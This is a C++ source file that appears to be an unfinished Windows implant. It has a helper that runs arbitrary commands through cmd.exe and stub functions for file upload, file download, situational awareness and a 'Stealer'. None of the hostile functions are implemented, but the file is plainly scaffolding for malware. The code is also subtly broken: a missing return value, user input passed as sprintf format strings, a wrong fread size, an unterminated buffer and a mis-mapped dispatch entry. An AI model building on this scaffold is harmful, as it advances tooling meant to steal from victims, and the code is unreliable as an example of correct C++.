#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unordered_map> // want to include standard c++ stl 
#include <iostream>
#include <windows.h>

/* main execute function*/
char * execute(char * program, char *args, char* outfile){
     LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
    if (cmdBuffer == NULL){
        printf("malloc failed");
        exit(1);
    }
    int j = sprintf(cmdBuffer, "cmd.exe /C ");
     j += sprintf(cmdBuffer + j, program );
     j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, args );
    j += sprintf(cmdBuffer+ j, " ");
    j += sprintf(cmdBuffer + j, " > ");
    j += sprintf(cmdBuffer + j, outfile);
    j += sprintf(cmdBuffer + j, "\0");
    // Values needed for CreateProcessA
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    // Dead squirrels
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // Dead squirrels 
    ZeroMemory(&pi, sizeof(pi));
    int retVal;

    retVal = CreateProcessA(    // No module name (use command line)
        NULL,        // Command line
        cmdBuffer,
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to TRUE binheritance
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi ) ;          // Pointer to PROCESS_INFORMATION structure
    
    if (retVal == 0){
        printf("Create process failed\n");
        exit(0);
    }
    WaitForSingleObject( pi.hProcess, INFINITE );
    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    free(cmdBuffer);
}


/* start of implant functions*/

void  FileUpload(std::string args){
}

void FileDownload(std::string args){}

void SitAware(std::string args){
}

void Stealer(std::string args){
    printf("DOING THIEVERY");
}


/* Dispatch Table Init*/
using pfunc = void (*)(std::string);
std::unordered_map<std::string, pfunc > dispatch_table;

void DispatchTableInit(){
    dispatch_table["SitAware"] = Stealer;
    dispatch_table["FileDown"] = FileDownload;
    dispatch_table["FileUp"] = FileUpload;
    dispatch_table["Stealer"] = Stealer;
    }


/*task functions*/
//tasks are lists of tasks structured [cmd: , args:, taskid: ]
void tasks_dispatch(char ** tasks);
//create results arr and return

void task_do(char *task);
//get cmd, args, id
//choose execute
// read output from file and return res



void tasking();

/* other helper functions necessary*/
std::string readFile(char * fileName){
     //GetFileSize
    DWORD fileSize;
    char* buffer;
    fflush(stdin);
    FILE * infile = fopen(fileName, "r");
    int size;
    
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    buffer = (char *)malloc(size);
    
    fread(buffer,sizeof(char *), size, infile );
    std::string buf;
    buf = std::string(buffer);
    return buf;
    
}


int main(int argc, char* argv[]){

    DispatchTableInit();
    //example of how to call the right function
    pfunc p = dispatch_table["Stealer"];
    std::string args = "";
    (*p)(args);
    



    return 0;
}